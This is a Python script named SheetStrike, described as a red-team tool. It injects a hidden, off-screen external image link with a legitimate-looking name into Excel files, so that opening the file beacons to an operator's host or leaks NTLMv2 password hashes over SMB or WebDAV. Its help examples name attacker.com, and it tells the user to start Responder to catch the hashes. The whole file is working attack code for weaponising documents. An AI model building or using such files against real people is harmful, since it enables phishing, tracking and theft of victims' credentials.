#!/usr/bin/env python3
"""
SheetStrike - Weaponize Excel files for red team operations
For authorized security testing and red team operations only.

Supports:
- HTTP canary (tracking opens)
- SMB hash capture (NTLMv2 via UNC path)
- WebDAV hash capture (NTLMv2 over HTTP/HTTPS)
"""

import argparse
import zipfile
import os
import sys
import shutil
import tempfile
import uuid
import random
from pathlib import Path

# Legitimate-looking resource names
LEGIT_NAMES = [
    "logo.png", "header.png", "footer.png", "chart_bg.png",
    "watermark.png", "template_img.png", "brand_asset.png",
    "report_header.png", "company_logo.png", "signature.png",
    "analytics.js", "tracking.js", "metrics.js", "telemetry.js"
]

# Legitimate-looking share names for SMB
SHARE_NAMES = [
    "images", "assets", "resources", "cdn", "static",
    "media", "files", "docs", "shared", "public"
]

# Drawing XML template
DRAWING_XML = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" 
          xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
    <xdr:twoCellAnchor editAs="oneCell">
        <xdr:from>
            <xdr:col>{col_start}</xdr:col>
            <xdr:colOff>0</xdr:colOff>
            <xdr:row>{row_start}</xdr:row>
            <xdr:rowOff>0</xdr:rowOff>
        </xdr:from>
        <xdr:to>
            <xdr:col>{col_end}</xdr:col>
            <xdr:colOff>9525</xdr:colOff>
            <xdr:row>{row_end}</xdr:row>
            <xdr:rowOff>9525</xdr:rowOff>
        </xdr:to>
        <xdr:pic>
            <xdr:nvPicPr>
                <xdr:cNvPr id="2" name="{pic_name}">
                    <a:extLst>
                        <a:ext uri="{{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}}">
                            <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" 
                                           id="{{{creation_id}}}"/>
                        </a:ext>
                    </a:extLst>
                </xdr:cNvPr>
                <xdr:cNvPicPr>
                    <a:picLocks noChangeAspect="1"/>
                </xdr:cNvPicPr>
            </xdr:nvPicPr>
            <xdr:blipFill>
                <a:blip xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" 
                        r:link="rId1"/>
                <a:stretch>
                    <a:fillRect/>
                </a:stretch>
            </xdr:blipFill>
            <xdr:spPr>
                <a:xfrm>
                    <a:off x="50000000" y="50000000"/>
                    <a:ext cx="9525" cy="9525"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                    <a:avLst/>
                </a:prstGeom>
            </xdr:spPr>
        </xdr:pic>
        <xdr:clientData/>
    </xdr:twoCellAnchor>
</xdr:wsDr>'''

# Drawing relationships template
DRAWING_RELS = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" 
                  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" 
                  Target="{target}" 
                  TargetMode="External"/>
</Relationships>'''


def generate_hidden_position():
    """Generate a position that's practically impossible to see"""
    col_start = random.randint(100, 200)
    row_start = random.randint(500, 1000)
    return col_start, row_start, col_start + 1, row_start + 1


def build_target_url(mode, host, custom_path=None, use_https=False):
    """Build the target URL based on injection mode"""
    resource = custom_path if custom_path else random.choice(LEGIT_NAMES)
    share = random.choice(SHARE_NAMES)
    
    if mode == "http":
        protocol = "https" if use_https else "http"
        return f"{protocol}://{host}/{share}/{resource}"
    
    elif mode == "smb":
        return f"\\\\{host}\\{share}\\{resource}"
    
    elif mode == "webdav":
        if use_https:
            return f"\\\\{host}@SSL\\{share}\\{resource}"
        else:
            return f"\\\\{host}@80\\{share}\\{resource}"
    
    return None


def inject_canary(input_file, output_file, target_url, verbose=False):
    """Inject the canary into an XLSX file"""
    
    if not os.path.exists(input_file):
        print(f"[!] Error: Input file '{input_file}' not found")
        return False
    
    # Create temp directory for extraction
    with tempfile.TemporaryDirectory() as temp_dir:
        # Extract XLSX
        if verbose:
            print(f"[*] Extracting {input_file}...")
        
        try:
            with zipfile.ZipFile(input_file, 'r') as zf:
                zf.extractall(temp_dir)
        except zipfile.BadZipFile:
            print("[!] Error: Invalid XLSX file")
            return False
        
        # Create drawings directory if not exists
        drawings_dir = os.path.join(temp_dir, "xl", "drawings")
        drawings_rels_dir = os.path.join(drawings_dir, "_rels")
        os.makedirs(drawings_rels_dir, exist_ok=True)
        
        # Generate hidden position and IDs
        col_start, row_start, col_end, row_end = generate_hidden_position()
        creation_id = str(uuid.uuid4()).upper()
        pic_name = f"Picture {random.randint(1, 99)}"
        
        if verbose:
            print(f"[*] Injecting at position: col={col_start}, row={row_start}")
            print(f"[*] Target: {target_url}")
        
        # Create drawing XML
        drawing_content = DRAWING_XML.format(
            col_start=col_start,
            row_start=row_start,
            col_end=col_end,
            row_end=row_end,
            pic_name=pic_name,
            creation_id=creation_id
        )
        
        # Create drawing rels
        rels_content = DRAWING_RELS.format(target=target_url)
        
        # Find existing drawing number or use 1
        existing_drawings = list(Path(drawings_dir).glob("drawing*.xml"))
        drawing_num = len(existing_drawings) + 1
        
        drawing_file = os.path.join(drawings_dir, f"drawing{drawing_num}.xml")
        rels_file = os.path.join(drawings_rels_dir, f"drawing{drawing_num}.xml.rels")
        
        # Write files
        with open(drawing_file, 'w', encoding='utf-8') as f:
            f.write(drawing_content)
        
        with open(rels_file, 'w', encoding='utf-8') as f:
            f.write(rels_content)
        
        # Update [Content_Types].xml to include drawing
        content_types_file = os.path.join(temp_dir, "[Content_Types].xml")
        with open(content_types_file, 'r', encoding='utf-8') as f:
            content_types = f.read()
        
        # Add drawing content type if not present
        drawing_override = f'<Override PartName="/xl/drawings/drawing{drawing_num}.xml" ContentType="application/vnd.openxmlformats-officedocument.drawing+xml"/>'
        if f"/xl/drawings/drawing{drawing_num}.xml" not in content_types:
            content_types = content_types.replace('</Types>', f'{drawing_override}</Types>')
            with open(content_types_file, 'w', encoding='utf-8') as f:
                f.write(content_types)
        
        # Update worksheet to reference the drawing
        worksheets_dir = os.path.join(temp_dir, "xl", "worksheets")
        sheet_file = os.path.join(worksheets_dir, "sheet1.xml")
        
        if os.path.exists(sheet_file):
            with open(sheet_file, 'r', encoding='utf-8') as f:
                sheet_content = f.read()
            
            # Add drawing reference if not present
            if '<drawing' not in sheet_content:
                drawing_ref = f'<drawing r:id="rId{drawing_num}"/>'
                # Insert before </worksheet>
                sheet_content = sheet_content.replace('</worksheet>', f'{drawing_ref}</worksheet>')
                
                # Make sure relationship namespace is declared
                if 'xmlns:r=' not in sheet_content:
                    sheet_content = sheet_content.replace(
                        '<worksheet ',
                        '<worksheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" '
                    )
                
                with open(sheet_file, 'w', encoding='utf-8') as f:
                    f.write(sheet_content)
        
        # Update worksheet rels
        sheet_rels_dir = os.path.join(worksheets_dir, "_rels")
        os.makedirs(sheet_rels_dir, exist_ok=True)
        sheet_rels_file = os.path.join(sheet_rels_dir, "sheet1.xml.rels")
        
        if os.path.exists(sheet_rels_file):
            with open(sheet_rels_file, 'r', encoding='utf-8') as f:
                rels = f.read()
            # Add drawing relationship
            new_rel = f'<Relationship Id="rId{drawing_num}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/drawing" Target="../drawings/drawing{drawing_num}.xml"/>'
            rels = rels.replace('</Relationships>', f'{new_rel}</Relationships>')
        else:
            rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId{drawing_num}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/drawing" Target="../drawings/drawing{drawing_num}.xml"/>
</Relationships>'''
        
        with open(sheet_rels_file, 'w', encoding='utf-8') as f:
            f.write(rels)
        
        # Repack XLSX
        if verbose:
            print(f"[*] Repacking to {output_file}...")
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arc_name = os.path.relpath(file_path, temp_dir)
                    zf.write(file_path, arc_name)
        
        if verbose:
            print(f"[+] Successfully created: {output_file}")
        
        return True


def main():
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║             ⚡ SheetStrike v1.0 ⚡                        ║
    ║      Weaponized Excel for Red Team Operations             ║
    ║                      @Durok                               ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    
    parser = argparse.ArgumentParser(
        description='SheetStrike - Inject tracking/hash capture payloads into Excel files',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  HTTP Canary (tracking):
    %(prog)s -i clean.xlsx -o tracked.xlsx -m http -H myserver.com/callback

  SMB Hash Capture (LAN):
    %(prog)s -i clean.xlsx -o evil.xlsx -m smb -H 192.168.1.100

  WebDAV Hash Capture (remote):
    %(prog)s -i clean.xlsx -o evil.xlsx -m webdav -H attacker.com

  WebDAV over HTTPS:
    %(prog)s -i clean.xlsx -o evil.xlsx -m webdav -H attacker.com --https
        '''
    )
    
    parser.add_argument('-i', '--input', required=True, help='Input XLSX file (clean)')
    parser.add_argument('-o', '--output', required=True, help='Output XLSX file (with canary)')
    parser.add_argument('-m', '--mode', required=True, choices=['http', 'smb', 'webdav'],
                        help='Injection mode: http (tracking), smb (hash capture LAN), webdav (hash capture remote)')
    parser.add_argument('-H', '--host', required=True, help='Target host/IP (your server or responder)')
    parser.add_argument('-p', '--path', help='Custom resource path (default: random legitimate name)')
    parser.add_argument('--https', action='store_true', help='Use HTTPS for http mode or SSL for webdav')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print(banner)
    
    # Build target URL
    target = build_target_url(args.mode, args.host, args.path, args.https)
    
    if args.verbose:
        print(f"[*] Mode: {args.mode}")
        print(f"[*] Target URL: {target}")
    
    # Inject canary
    success = inject_canary(args.input, args.output, target, args.verbose)
    
    if success:
        print(f"\n[+] Canary injected successfully!")
        print(f"[+] Output: {args.output}")
        
        if args.mode == "smb":
            print(f"\n[*] Start Responder before sending the file:")
            print(f"    sudo responder -I <interface> -v")
        
        elif args.mode == "webdav":
            print(f"\n[*] Start Responder with WebDAV:")
            print(f"    sudo responder -I <interface> -wv")
        
        elif args.mode == "http":
            print(f"\n[*] Ensure your HTTP server is listening for callbacks")
    else:
        print("\n[-] Injection failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
